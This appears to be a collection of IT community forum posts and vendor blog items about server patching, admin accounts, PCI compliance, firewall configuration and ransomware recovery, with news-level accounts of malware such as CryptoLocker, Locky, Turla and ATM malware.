thatservers will boot and run normally after this mess. *** I don’t have a testenvironment, let alone one that mirrors my production environment. I don’t wantto be working on fixing server issues 24/7 for a week or more after. 😊 Afterall, I am the only IT person they have here (Bad decision in my humble opinion,but that’s another story for another day)I think I asked this already - IfI enable the fixes on my servers, will they boot up normally? (Reassuranceneeded again 😉)We have a single SQL 2014 serverthat runs Autodesk Vault 2017. Do SQL Servers need these updates applied aswell? I thought I read somewhere that if you are NOT running 3rdparty unsigned code, you don’t have to rush to patch SQL. Is that correct?Are there any issues after applying the fixes and enabling them, with bootingbackup and running as normal for SQL?Finally, if I do NOT enable theOS patch via the 2-3 registry settings and rebooting, the patches are notprotecting me, correct?Thank for any and all help you can offer. ",0

637469,Securely Access Windows Servers,"Currently working on improving the way that our IT department manages servers and getting away from anyone using domain admin credentials (it happens here!!), our department is totally 7 now, some programmers, IT help desk, IT manager and myself the system admin. Wonder how I should structure the user accounts that have access to servers. I think that everyone in the department should have at least two accounts, one will be used for daily activity like email and web surfing. The other should be for admin proposes like logging into servers (if needed), using MMC consoles to manage services, etc. I think I would have three accounts, the third will be for domain and forest wide changes since I am the only one that will be touch anything with at that level. Should we use an Admin box? Something that we log into with the admin accounts I created and then we can do what we need to do from there. This should help with Pass the Hash I would think. RDP or not? Any suggestions are welcome. ",0
1614402,So you're Locky..... I'm ready!,"   I knew it was only a matter of time before our network was darkened with some form of Crypto Malware. That day had finally arrived, but we were prepared. While commencing some packet inspection in SNORT (I monitor our SNORT IDS very heavily), I was alerted by our Sophos AV that it had killed a process name Locky-A. I quickly shifted to my other SNORT screen an confirmed someone had initiated Win32 Necurs Trojan download, and that program had downloaded the a variant of Locky.   I noticed through SNORT that Locky had already beaconed to its Command and Control server, I knew I had to act fast. Utilizing SNORT I was able to find the infected PC's IP address. From there a quick nslookup determined the machine name. I immediately shutdown the port to that machine and notified the user of the infection, and to shutdown her machine. After cutting the infected machine off from the network I proceeded to block all inbound and outbound IP's associated with that variant.   I then drove to the users location and commandeered the infected machine. The user informed me that the infection came through via email. The user was also pretty dismayed about the infection. I explained to the user that it wasn't a big deal, we can recover from this. I then took the PC back to the office and booted the machine with a Linux Live Disc, and pulled all unencrypted files from her machine, favorites, desktop shortcuts, things of that nature.    The user had Windows 7 on her machine, and since we are going through with a Windows 10 upgrade on all of our machines, I figured it would be a great time to upgrade this machine, and throw a solid state drive into the machine while I was at it. While I was reloading Windows, I did a search for encrypted files on the server, I was only able to locate two files that were encrypted.  Those two file were deleted and the backup files were restored by Microsoft DPM. Once Windows had completed it's software install, all the required software was reloaded and the computer was placed back into service.   The user was extremely happy to have everything back as normal, just 10x faster with the Solid State Drive :) . This roughly took place over a 4 hour time period. As I look back I feel that we were very successful in recovering from this incident, and I really accredit that to the following security layers.1. Our Sophos Antivirus  2. Our SNORT IDS monitoring all egress and ingress traffic of our NAT device. 3. Strong Windows Server ACLs limiting user access. (Least privilege) 4. Up to date patching 5. Very limited local admin users.6. DPM Backups   Over the next couple of weeks I would like to start implementing software white lists through GPO, hopefully this will curve any foreseeable future threats, but in the famous words of the Terminator I can hear the Malware saying ""I'll be back.""Aaron",11

We are in an era where devices, services, individuals and entities all interconnect via complex networks in the cloud. The future holds endless possibilities but also presents many challenges, particularly in the cybersecurity and data loss prevention domain. TUV OpenSky identified the following as the six most critical trends in cybersecurity for 2018.   Global regulation and how it is driving the costs of privacy and data protection. Internet of Thing (IoT) and how it is the mutli-facet threshold between privacy, safety, cybersecurity and data. Operational technology emerges as a frontline for cyber attacks.The shift from reactive to proactive reconnaissance threat and vulnerability detection and response. The rise of IT domain certifications and their importance for professionals.  Artificial intelligence (AI) and the way automation tools and services are becoming more prevalent in cyber defense strategies. While technology is the catalyst and plays an integral part for organizations to achieve their overall business strategy, the evolution of IT is far outpacing our understanding. Organizations are struggling to find candidates who fulfill all the requirements making internal training and promotion more critical than ever before. Employees want career development opportunities, and organizations need talent who can grow and adapt as technology continues to evolve. It's a win-win solution.

1957306,Trend Micro discovers 'Alice' ATM malware,"Alice malware A different type of cyber crime is growing in popularity. It's called Alice, and it could become a serious challenge for financial institutions that don't have the safety protocols in place to curb it.Trend Micro discovered this new Malware in November 2016, and found it may be the simplest but one of the most effective malware families to date. Alice doesn't steal people's data like typical malware. Instead, it gives cybercriminals access to something just as valuable: money.Alice infect an ATM by running two files in its root directory, noted Trend Micro, then it connects to CurrencyDispenser1​ the default name for money dispensing hardware, and if the criminal inputs the correct Pin, Alice opens the ""operator panel."" From there, the criminal can steal money.Sancho noted that malware similar to Alice is likely to grow in the coming years. It's no longer a ""niche"" attack. He added that while today they might use off-the-shelf packers, these criminals could soon turn to custom packers and unique procedures to stay undetected.While something like Alice is likely to catch financial institutions off guard, because it's a new type of attack, there are still ways to keep their facilities protected. Install high-definition security cameras that alert authorities of suspicious activity, don't set up ATMs in areas that have high crime rates (if you can help it), teach your employees about best-practice IT safety protocols and use advanced software to protect machines.Source",0

620296,PCI compliance and Windows/AV updates,"All,I am currently reviewing our PCI-Complaince setup as I have come to replace our XP machines (yes I know, several months late but I am doing it now!!).  It is a simple setup of 3 machines in their own VLAN, we take card payments over the phone and use a 3rd party internet processing service (Barclay's and Sage Pay).  The machines at the moment are restricted to only accessing the IP's of the service, as specified by the 3rd party service.  At no point is any card data stored on any of these workstations (by policy and heavily restrictive GPO's), it is transmitted (HTTPS) to the 3rd party processing service.  By heavily restricting this VLAN to only taking to these WAN IP's, we don't have to include our LAN/DMZ as part of PCI-Compliance checks.I would like to automate the AV and Windows updates on these machines as it has been a manual process in the past.Doing some digging, seems as though MS do not suggest using IP's firewall filters as they are likely to change, and as Symantec End Point does not like the host file hack I do.We have WSUS and SEMP on our Internal LAN which could assist with this, give us additional auditing, and I believe I can simply create a firewall rule that allows the machines on the PCI-C VLAN, to connect to these update servers on the LAN (so no real difference between what I am doing now with access to the WAN), and the LAN would still remain excluded from the PCI-E auditing steps?Is anybody able to confirm this for me?  Want to keep this as simple as possible as well as reducing the amount of maintenance time I put into it!Thanks",0

1448819,Are there any Cyberoam users that have updated to the new Sophos OS?,"At the MSP I do part time work for we have been installing Cyberoam CR15iNGs at our customers over the past few years. ﻿We've been happy with their functionality and reliability so far.Lately we've seen that the new Sophos Firewall OS was available as an upgrade. We've been hesitant to install it merely because it's a completely unknown interface to us. This morning I went ahead and tested it out on a spare device.My first impressions are not so good.Having to register my device at Sophos just to get the firmware upgrade was annoying. If I have the device I feel I should be able to simply grab the latest firmware from a standard download page. After the initial flash the reboot took over 5 minutes before the device was accessible again. I was prepared to wait longer but there was no warning that it could take such a long time. Someone else might have been tempted to power cycle the thing before then.When it finally did come up it all my settings looked to be in place as we had internet access, and our internal services such as email and web traffic were coming through just fine.At first login to the UI I was given the option to receive a 30 day full trial, or to transfer my existing subscriptions, or to just go with the basic settings. I wanted to do the 30 day trial but it errored out saying it couldn't contact the sophos servers. So I went with basic settings since I had no previous subscriptions to transfer.This took me to a page that wanted my WAN info. Not sure why it wanted that info since the device was currently working just fine but I went ahead and filled it out. There was also a section below that wanting Parent Proxy info. I'm not exactly sure what that meant but it would not let me save the settings until I filled in something. Since we had no proxy info to put in I cancelled out and went back to the subscription screen.I chose to transfer my subscriptions and that seemed to work as I was then taken to a network configuration screen.Again this is confusing because everything was already configured and working. But there was an option to skip so I selected it and finally was taken to the main config screen.Wow, what a difference. I suppose it makes sense since it's a completely different OS but it felt as though I was moving from Windows 95 to 10. Just about everything is different.I've found where a lot of things have moved to or are called now but I've yet to find the actual firewall rules. That one is particularly frustrating.The interface also feels more sluggish and less responsive. I can live with that though.I'm curious if any other Cyberoam users have upgraded to the Sophos OS and what your experience has been? Any particular Pros or Cons? Things you hated or things you loved?I'm sure these next few weeks are going to be interesting. I feel this is something I need to learn since we could eventually be upgrading a few dozen others in the future.  ",11
1973711,Meeting criteria for multiple SAQs or straight to SAQ D?,"Hello,I'm a Website Manager for a medium sized charity - a level 3 merchant.We currently have SAQ B for a dial-up PDQ machine for card-holder not present, handled by Worldpay - this is for phone orders and paper forms.We are looking to introduce Stripe for online payments, using their standard Stripe JS model, which they say sits within the criteria for SAQ A.After pouring over PCI compliance guidance, I am still not clear on whether we could self-certify for both SAQ A and B at the same time, or whether we have to move to SAQ D if our circumstances aren't neatly covered by the criteria of any other single SAQ level.Also not sure about the definition of a 'payment channel' as the guidance refers to it - if the payment processor is different for each process, are they distinct channels, and therefore acceptable to self-certify with two different SAQ levels?Any tips would be greatly appreciated.Thanks",5

SCCM seems somewhat excessive for our needs and (although I seem to not actually be able to get a quote) seems like it costs ££££££!Is SCCM the only way to go with this or is there a simpler alternative? Also, if we do end up getting the management server, will it pick up all the installations out there already, and allow me to manage them (a bug bear at the moment is all the PC's scan at a time they usually aren't on!) or will it require a further reinstall of the AV software?Any help/guidance will be much appreciated :)",0
2062134,NPS Authentication Methods,"I'm slowly learning about RADIUS as it pertains to Microsoft's NPS server role.  I'm wanting to implement 802.1x authentication for our wireless network as well as for port-based authentication.However, I think I have a few misconceptions about how some of these authentication methods work/function, and some general questions.I'm trying to authenticate BYOD devices on the WLAN using domain credentials.I've got the NPS server up and the policies configured.  RADIUS clients are added with proper shared secrets, etc. etc.  However, when trying to connect a device to the test SSID, I enter my domain credentials, to which it responds that I am unable to join the network.  PEAP is selected as the authentication method.So, now my questions:1.  For the WPA2-Enterprise, does the authentication protocol I use need to support usernames/passwords?  Everywhere I look it is recommended to use PEAP, however to my knowledge PEAP is purely a certificate-based method.  Would i need to use EAP-MSCHAPv2 or something else to accomplish this?2.  IIf PEAP is the way to go, is a self-signed X.509 certificate acceptable?  Given the supplicant device has no idea what server it should be connecting to, there is no identity for the certificate to validate, right?Still a bit of a newbie with NPS so I apologize if the above isn't properly worded/phrased.",0

Large companies (with more than 5,000 employees) on average have 31 to 50 data loss incidents per day, according to the study, which was released Sept. 14. Not surprisingly, financial services and retail companies have more data loss incidents than other industry verticals. Also of particular note is the unending growth of malware, with McAfee Labs now tracking a malware zoo of more than 600 million samples. A number of specific areas of malware are growing fast, with mobile malware growing to more than 10.5 million samples. Ransomware is also on the rise, with the total volume of ransomware samples  known to McAfee now topping 7 million, a 128 percent year-over-year increase from 2015.Not all forms of malware are growing though, new Mac OS malware declined by 70 percent during the second quarter.

You can argue out of it, proving the files were already encrypted for example, but nobody needs that kind of trouble.DFS updated the New York Cyber regulationAmong other things, DFS changed the wording so that they have 72 hours after DETERMINING a breach to notify DFS, as opposed to 72 hours after the incident happened.

439648,Worst Phishing Scam Of The Week Yet: Cryptolocker,"﻿We here at KnowBe4 have been getting a lot of system admins calling us with the request for security awareness training because end users have been tricked into opening up attachments of phishing emails and infected their workstation with the cryptolocker malware. This started last September and it's not going away but actually getting worse.This malicious hijacker code detects the personal files of a user and wraps them in strong encryption. This is both the local user Docs and remote shared folders. It encrypts every file with standard Office extensions, including images and PDFs!The bad guys ask $300 to ""give your files back"". Initially they asked for just $100 but realized they were too cheap and people would pay more so they bumped up the price.In many cases, system admins and repair professionals come to the conclusion that the only (and fastest) way to get the files back is to pay the ransom. The problem is that you could get rid of the malware itself, but the files are still encrypted, and without the malware you cannot decrypt your files anymore.Surprisingly enough, the bad guys do indeed live up to their criminal promise (if their payment servers are up) and decrypt the files if you pay. The decryption will start at a rate of about 5GB per hour. Note that the key that ""unlocks"" your files is unique; you will not be able to use anyone else's key.Malware researchers from almost all antivirus companies are furiously working on a way to prevent this from occurring, and some are able to block it from running, but these bad guys are very sophisticated; decrypting the user's ""cryptolocked"" files requires access to both the public and private keys used to encrypt them. Moreover, they change their malicious code all the time, and your antivirus might not catch it tomorrow. Antivirus companies are not able to decrypt the files, only the Cryptolocker malware can do the decryption. At this point in time probably the only people that know how to solve this are the NSA and they are being silent. And how does this malware get installed on a workstation? You guessed it, users being social engineered and opening an infected email attachment. The bad guys are pulling out all the stops and use a variety of social engineering tactics, most recently it's tracking information from either DHL, UPS, FedEx and USPS, but there are many phishing attacks including banks and government.So what does it do after a user opens the infected attachment? 1) They are presented with a cryptolocker splashscreen similar to the one attached 2) It will encrypt files on volumes (network, locally attached) where the user has modify permissions3) They are asked to pay ransom via GreenDot MoneyPaks, BitCoin, CashU, paysafecard, or Ukash of either $100 or $300 (depending on the older or newer version) 4) Cryptolocker will set a timer to decrypt the files if the user decides to pay the ransom 5) If the timer expires, the software uninstalls itself(!) and the data is lostOnce infected, the only way to fix this relatively fast:- Make sure you have a recent backup of the files that actually can be restored, wipe and rebuild the machine from scratch, and restore the files.- We see an average of three hours of admin work for this.Showing the need for training is that often these attachments are blocked by existing filters as ""possible malware"" but users request them to be released, and the (outsourced) helpdesk released them... Users then finally admitting to opening the attachment but saying it did nothing, however they could not open their files afterward.So, go to the KnowBe4 website and get a quote for the amount of users in your organization. It's the orange button to the right of Kevin's picture. Do it now, before a user gets social engineered and their files are cyptolocked.Warm regards,Stu SjouwermanFounder and CEOKnowBe4,LLCstus@KnowBe4.com",11

I have been into the configure updating section and it was initially greyed out, so i edited the config file then inputted the correct license details (other users were greyed out, but editing this file then inputting details fixed theirs) but his still doesn't update. I have double, triple checked the license info and it's right. Have tried a complete remove then reinstall but all with no success.  I then thought it may be down to pure internet connection as it says it cant connect to server, but then he says it happens whether he's working here or at home and wherever he is it doesn't connect. Any suggestions? Thanks in advance!! ",5

(NYSE: CUDA), a leading provider of cloud-enabled security and data protection solutions, today announced a joint effort to enhance email security, improve user awareness, and help protect employees from targeted phishing attacks. As part of the effort, Barracuda’s cloud-based email security solutions, including Barracuda Essentials for Office 365, now includes integrated education and training exercises to help employees identify potential threats, such as phishing and ransomware, to reduce risk of data loss.“Even the strongest security technology and practices cannot compete with a highly sophisticated spear phishing attack. Unfortunately, it’s not a matter of if, but when an employee will click on a malicious link,” said Buddy Davis,  Vice President at Data Network Solutions, a Barracuda Premier Partner.“With this announcement Barracuda and KnowBe4 are bridging the gap between security technology and training education. The joint effort merges award-winning protection from email-borne attacks, spam, and viruses, with industry-leading training and education to help workforces identify potential threats.”An educated employee trained to identify potential threats significantly reduces the risk of an organization falling prey to spear phishing and ransomware attacks. However, with the evolving nature of these attacks and human error at play, it is inevitable that someone will eventually click on a suspicious or malicious link, making it even more critical to deploy layered security designed to stop these targeted attacks.

2182905,Network Penetration Testing,"Written by Ian Thornton-Trump What is Penetration Testing?Penetration testing, often called “pen testing” is one of several techniques used to verify cybersecurity posture and provide a level of assurance to the organization that its cyber defenses are functional. It’s a way of testing defenses against an adversary who mimics a cyber-criminal actor.First Rule of Network Penetration Testing: Make sure you have a signed contract to perform the services of a pen tester, including a statement of work, and a detailed scope for the engagement. Failure to follow this advice could result in civil and/or criminal legal action being taken against you.It should be noted that many compliance and regulatory requirements, including the General Data Protection Regulation (GDPR) require an organization to undertake regular testing to evaluate the effectiveness of organizational security controls. It stands to reason that the further an adversary can penetrate into your organization and retrieve sensitive and/or confidential information, the more evident the business case for improving your cyber security posture becomes.The technique of cyber security pen testing is not without controversy. Detractors of pen testing as a cybersecurity test identify the techniques used by professional pen testers as generally reserved for sophisticated cyber criminals or nation state actors. The argument then is pen testing does not mimic the “every day” cybersecurity threat faced by the organization based upon the level of risk tolerance.Although that argument runs right up against the evolution of and increasing sophistication of cyber-criminal attacks, an organization may not have the financial or IT resources to deal with the outcomes or recommendations of the pen test. In fact, a pen test can be a demoralizing experience for the organization’s already stressed IT resources and potentially document risks the organization would rather not have illuminated.Simply put, a pen test requires a basic level of cyber hygiene and organizational readiness – there has to be organizational will to mitigate the “findings” of the pen test. If the organization has not instituted basic cyber security controls as prescribed by UK Cyber Security Essentials or the CIS top five security controls, then money invested in a pen test may be quite wasteful.In short, If the organization has not:1.     Secured the internet connection with a firewall2.     Secured organizational devices and software3.     Controlled access to organizational data and services4.     Protected organizational endpoints from viruses and other malware5.     Made sure organizational devices and software are up to dateThen the pen test will not go well for your organization and an adversary will have a field day.Penetration Testing ToolsThere is a myriad of pen testing tools available with the majority being open source. The profession of Pen Tester is linked to professional certifications such as Certified Ethical Hacker, CompTIA Pen Test+ and Offensive Security Certified Professional (OSCP), and an extensive SANS curriculum all built around pen testing and use of popular tools is available.Here is a list of common pen testing tools (OK, my favorite tools!) pen testers will unleash on an organization. Many folks in the business of professional pen testing have their own preferences and/or professional software is also available.Common Network Penetration Testing ToolsNmap – Free! Network scanner and enumerator, supported by a massive community and extensible with a great deal of scripting capability.The Metasploit Framework available on Kali Linux – Free! Many special purpose pen testing tools, password crackers as well as wireless security tools. I would say this is an accepted industry standard.Zap – Free! An older attack proxy framework used to evaluate website and web application security. I like it and find it easy to use as I am not skilled enough to use something like Burp Suite against a website.Nessus – Not free. This software...To continue reading, click here",11

The brief story is:On a given Friday a short business conversation by email occurred between one of our staff and a supplier. After sending a confirmation on a wire transfer to pay over an outstanding order, the supplier asked  when the agreed remaining amount would be settled, to be told that it would happen the following week.Over the weekend, the MiTM registered two domains similar to the two of us (ours and the supplier’s), effectively registering, let’s say, compamy.com instead of company.com.Two messages were sent in both directions, spoofing the email addresses and having the “reply to” changed so that the replies were sent to the MiTM. The one to the supplier asked for clarification on the amount to be settled and the one sent to us asking for a change in the bank account to be used for the wire transfer.Over Monday a conversation took place to clarify their request (we require formal documents to have any account changes made, specially bank accounts). And those were issued – faked documents from seemingly legitimate sources confirming the account change.

893118,Upstream Firewall Rules on Outbound Traffic,"Hey all, i'm having a conversation with my security conscious VP of IT where I work. We run a multi-layered firewall approach where I work. To give an idea:As you can see from the picture, the Sophos UTM's are the default route out for the internal network/DMZ. I have inbound AND outbound traffic filtered on the Sophos devices. On the ASA's (both the carrier ASA's and then the Active/Passive cluster) I am filtering traffic inbound (of course) but outbound is set to Inside Network -> Any -> Allow.When I try and implement rules on outbound traffic at the ASA's it is mostly successful save for the response traffic to external users of our website (which is too be expected in my mind as the Sophos devices are handing the session tracking information). The VP is stating that we should be able to secure outbound traffic at the ASA's just like we are on the Sophos devices. I have an HTTP/S allow out rule there, but since the external users response port is in the random range, it blocks that response traffic when I enable those rules.Is there a way around this? I don't believe there is but that's why I wanted to reach out to the experts.",0

Web Protection- not configured.Endpoint Protection- not configured.Webserver protection- not configured.Since deployment, with my 1Gbps circuit, i am only getting about 70mbps speeds through the UTM. when i plug directly into the edge router, my speeds bump up to closer to 1gGbps speeds. Does anyone have any suggestions as to what i can check to ensure that the UTM is optimized? Under QoS, there are some settings that i saw that were 102.4 Mbps rate limits on the WAN link, but those settings are not active. Is it possible that those settings are default? I have contacted support, but i havent gotten a call back. i have seen a few posts about putting the UTM on bare metal and adding memory and SSD's. However, most instances of people that have done that are home users. Has anyone ever attempted to do this in an enterprise environment? i am currently using UTM hardware, but i can download the XG platform and install in VmWare easily. All Sophos says is ensure that you dont oversubscribe beyond your licensing and you will be fine. I am probably going to find myself a new server in which to install this, go up to 32GB RAM, SSD's, and multi-core CPU's, but before we try that route i want to make sure i cant make due with the hardware i have.I love Sophos, but lately their support is less than lackluster.Thanks, Y'all!",0

2091396,Uber Total Loss: 57 Million Records Stolen But Data Breach Was Hidden For A Year,"Oh boy. Uber is known for pushing the limits of the law and has dozens of lawsuits pending against it, but this one went too far and now comes the reckoning.Bloomberg was first to report that hackers stole the personal data of 57 million customers and drivers from Uber, a massive breach that the company concealed for more than a year. Finally, this week, they fired their chief security officer and one of his deputies for their roles in keeping the hack under wraps, which included a $100,000 payment to the attackers to ""delete the data"". Yeah, sure!Victim Of A Simple Credentials Phishing Attack?Here’s how the press describes the hack: Two attackers accessed a private GitHub coding site used by Uber software engineers and then used login credentials they obtained there to access data stored on an Amazon Web Services account that handled computing tasks for the company.From there, the hackers discovered an archive of rider and driver information. Later, they emailed Uber asking for money, according to the company. If you read between the lines, that could very well be a simple credentials spear phishing scheme, done with some crafty social engineering, or perhaps careless developers leaving internal login passwords lying around online:Failure To DiscloseJoe Sullivan, the outgoing security chief, spearheaded the response to the hack last year, a spokesman told Bloomberg. Sullivan, a onetime federal prosecutor who joined Uber in 2015 from Facebook Inc., has been at the center of much of the decision-making that has come back to bite Uber this year.Bloomberg reported last month that the board commissioned an investigation into the activities of Sullivan’s security team. This project, conducted by an outside law firm, discovered the hack and the failure to disclose, Uber said.SNAFUS are bad, but cover-ups can kill youNo doubt regulators will also be asking tough questions about why they were not informed about the breach until this week, and class-action lawsuits... heeeere we come!Uber says it has ""not seen evidence of fraud or misuse tied to the incident."" Let's hope that they are right, but it is highly unlikely that these records were deleted. It's practically sure they are sold on the dark web or will be. There are many ways that data could be abused by criminals without Uber ever becoming aware.All organizations would be wise to remember this: SNAFUS are bad, but cover-ups can kill you. You can ask forgiveness for being hacked and handle your disclosure correctly, but many people will find it harder to forgive if you deliberately covered up the truth.Expect Uber-themed phishing attacksNow that this is all over the press, the bad guys are going to send Uber-themed phishing attacks in a variety of flavors. First will be emails with warnings like ""Your Uber Account Has Been Compromised"" sending people to compromised websites where indeed their credentials will be stolen! You can imagine online criminals are going to have a field day with this, since it's all over the press and people are going to get worried.I suggest you send the following to your friends, family and employees, feel free to copy/paste/edit:Uber has suffered a data breach a year ago, and the address and email information of 57 million people were stolen. Uber paid off the hackers who then supposedly deleted the data, but that cannot be confirmed. Watch out for phishing emails related to this Uber data theft, for instance that your ""Uber account was compromised"" and that you need to change your password, or anything else related to Uber that could be suspicious.Never click on a link in an email, always go to the website yourself through your browser's address bar or a bookmark you have set eaarlier. Remember, Think Before You Click!Warm regards,Stu SjouwermanFounder and CEO, KnowBE4, Inc.",12

And while the concept of ""security"" truly knows no time, it's still interesting (and educating) to speculate the security menaces that we'll be talking about come December 31, 2016. In a recent piece from Fast Company,  three security menaces that we could see prevail in 2016 were outlined:1. Attacks on smartphones.Phones will become the new number 1 target over PCs. ""Mobile malware is progressing from isolated or theoretical to widespread and dangerous, especially on Apple's iOS operating system.""2. Ransomware will hold data or devices hostage.In 2016, we can  expect to see crooks to make more money by targeting really valuable files belonging to people and companies that can pay more. 3. Newly connected gadgets will leak important information.Data on fitness bands, smart TVs, and the like is often transmitted without any encryption, making it easy to steal or fiddle with. Also, home routers are often left in the factory setup with default usernames and passwords that almost anyone can gain access to.What security menace do you think will take the headline at the end of the this year? More importantly, how are you preparing to deal with these new threats as well as old ones?﻿",0

Once the coast is clear, the ""Gatak Trojan"" is programmed to spread aggressively across an organization's network, creating backdoors before stealing information. In addition to “strategic lethargy” being an interesting tactic to share, it’s also one that really underscores the importance of a major shift we’re seeing in security — it’s not enough to do static file analysis (like most AV does), you need to block malware based on its behavior at run-time.  Ex: Whereas “sleeping” can help trojans like Gatak get past other security, the fact is if it wants to complete the attack it has to take action at some point — and that’s where Barkly stops it.

When I try to boot a ghost disk all it does is hang in the PC-DOS cursor. I've tried changing settings in the computer( disabled wireless & disabled PXE boot), creating multiple boot disks with various types of NIC driver for that system, upgrading to the latest version of ghost, deleting files from the Ghost folder (mouse.exe & mouse.ini), tried the boot disks on other types of computers (they all worked), and I tried using the multiple disks on three different types of E6510 machines but none of them work. I edited the actual configuration file in Ghost wizard taking out the if mouse.com exists config, I also tried creating floppy disks with the ghost boot on it and it still did not work. When I was talking with the Dell tech earlier he had me take out the hard drive so the machine would boot to the CD-ROM drive but it still hung in the PC-DOS cursor.

751902,WHITE PAPER▶ Symantec Security Response Presents:The Waterbug Attack Group,"Greetings ITPros!  Remember that nasty little piece of Malware called Turla?  We did a blog on it last summer...and now we have a LOT more research on the group who made it: Waterbug. Some great info here to protect your environment from these crooks. Dig it:Turla: Spying tool targets governments and diplomatsCyberespionage group uses sophisticated malware to target former Eastern Bloc countries.﻿﻿ A cyberespionage campaign involving malware known as Wipbot and Turla has systematically targeted the governments and embassies of a number of former Eastern Bloc countries. Trojan.Wipbot (known by other vendors as Tavdig) is a back door used to facilitate reconnaissance operations before the attackers shift to long term monitoring operations using Trojan.Turla (which is known by other vendors as Uroboros, Snake, and Carbon). It appears that this combination of malware has been used for classic espionage-type operations for at least four years. Because of the targets chosen and the advanced nature of the malware used, Symantec believes that a state-sponsored group was behind these attacks.Turla provides the attacker with powerful spying capabilities. Configured to start every time a computer starts, once the user opens a Web browser it opens a back door that enables communication with the attackers. Through this back door, the attackers can copy files from the infected computer, connect to servers, delete files, and load and execute other forms of malware, among other capabilities.The group behind Turla has a two-pronged attack strategy that involves infecting victims through spear phishing emails and watering hole attacks. The watering hole attacks display competent compromise capabilities, with the attackers compromising a range of legitimate websites and only delivering malware to victims visiting from pre-selected IP address ranges. These compromised websites deliver a payload of Trojan.Wipbot. It is highly likely that Wipbot is then used as a downloader to deliver Turla to the victim.VictimsWhile infections initially appeared to be spread over a range of European countries, closer analysis revealed that many infections in Western Europe occurred on computers that were connected to private government networks of former Eastern Bloc countries. These infections appear to have transpired in the embassies of these countries.  Analysis of infections revealed that the attackers were heavily focused on a small number of countries. For example, in May of 2012, the office of the prime minister of a former Soviet Union member country was infected. This infection spread rapidly and up to 60 computers at the prime minister’s office were compromised.Another attack saw a computer at the embassy to France of a second former Soviet Union member infected in late 2012. During 2013, infections began to spread to other computers linked to the network of this country’s ministry of foreign affairs. In addition, its ministry of internal affairs was also infected.  Further investigation uncovered a systematic spying campaign targeted at its diplomatic service. Infections were discovered at embassies in Belgium, Ukraine, China, Jordan, Greece, Kazakhstan, Armenia, Poland, and Germany.At least five other countries in the region were targeted by similar attacks. While the attackers have largely focused on the former Eastern Bloc, a number of other targets were also found. These included the ministry for health of a Western European country, the ministry for education of a Central American country, a state electrical authority in the Middle East, and a medical organization in the US.Prior to publication, Symantec notified all relevant national authorities, such as Computer Emergency Response Centers (CERTs) that handle and respond to Internet security incidents.Attack vectorsThe group behind Turla uses spear phishing emails and watering hole attacks to infect victims. Some of the spear phishing emails purported to come from a military attaché at a Middle Eastern embassy and had an attachment masquerading as the minutes of meetings. Opening the attachment resulted in Trojan.Wipbot being dropped on to the victim’s computer. It is believed that Wipbot may be the delivery mechanism for Turla as they share several similarities in code and structure.Figure 1. Spear phishing emails and watering hole attacks are used to infect victims with Trojan.Wipbot, which can then be used to install Trojan.TurlaSince September 2012, the group has compromised at least 84 legitimate websites to facilitate watering hole attacks. Websites owned by a number of different governments and international agencies were among those compromised by the attackers.Visitors to these sites were being redirected to Web servers where a ‘fingerprinting’ script was executed. This script collected some identifying information about the visitor’s computer. This phase of the campaign appeared to serve as an intelligence trawl, gathering information about what browsers and plugins website visitors were using, which would help identify which exploits would work best against them.The next phase of the operation was highly targeted, with servers then configured to drop Wipbot only to IP addresses associated with intended targets. In one instance, the malware delivered was disguised as a Shockwave installer bundle. Wipbot was then used to gather further information about the infected computer. If the attackers deemed the victim of interest, it appears likely that a second back door (Trojan.Turla) with far greater capabilities was downloaded on to the victim’s computer.Wipbot appears to act as a reconnaissance tool, while Turla is used to maintain a long term presence on the victim’s computer. Analysis conducted by Symantec has found several technical connections between Wipbot and Turla which indicates the same group or larger organization wrote both pieces of code.TurlaSymantec has been tracking the activities of the group behind Turla for a number of years. The identity of the attackers has yet to be established, although timestamps from activity associated with the attacks indicate that most activity occurs during the standard working day of the UTC +4 time zone.Turla is an evolution of an older piece of malware, Trojan.Minit, which has been in operation since 2004. The current campaign is the work of a well-resourced and technically competent attack group that is capable of penetrating many network defenses. It is focused on targets that would be of interest to a nation state, with spying and theft of sensitive data among its objectives.Symantec protectionSymantec has the following detection in place for the malware used in these attacks:AVTrojan.TurlaTrojan.WipbotIPSSystem Infected: Trojan.Turla ActivitySystem Infected: Trojan.Turla Activity 2Update – January 22, 2015:Symantec Security Response has published a whitepaper containing more information about the attack group behind this campaign and detailed indicators of compromise for the malware involved.

328884,Data Breach Investigations Report 2013,"Verizon released the 2013 version of their Data Breach Investigations Report yesterday. The contributing agencies have grown from 4 in 2012 to 18 in 2013. There is a lot of good information in this report for everybody. From the intro:And from pubs to public agencies, mom-and-pops to multi-nationals, nobody was immune. As a result—-perhaps agitated by ancient Mayan doomsday predictions—-a growing segment of the security community adopted an “assume you’re breached” mentality.Some interesting things to me in the report:78% of initial intrusions were rated as low difficulty69% of breaches were discovered by external parties66% of breaches took months or more to discoverIn other words, for the majority of networks that were compromised, it was easy to break in and the intruders had access for a long time until an external party notified the organization that they were compromised. To me, those are sobering statistics.Well worth the download and read. The best thing: you don't have to register or give any information to download the report; just click the download link and get the PDF. Thanks, Verizon!http://www.verizonenterprise.com/DBIR/2013/",0

That rule will be applied when the user logs on or whatever, and within the domain it does what I need it to do.Scenario: A user (we'll call her ""Sally"") with a work laptop takes said laptop home to do some work over the weekend. The work laptop has had the SPICE001 rule applied successfully while it was on the domain. Sally connects her work laptop to her home WiFi router, and her home router is configured to give out IP addresses in the private range of 192.168.0.*Does this mean that someone else on Sally's home network, who has the private IP address 192.168.0.10, will be able to take advantage of the SPICE001 rule that I created for my domain?On the surface it looks like I've poked a hole in Sally's work laptop's security that might be okay on the domain but at home introduces a potential security risk. I can probably mitigate this a little using port numbers, but beyond that...?Hopefully that's clear - or am I missing something?",0

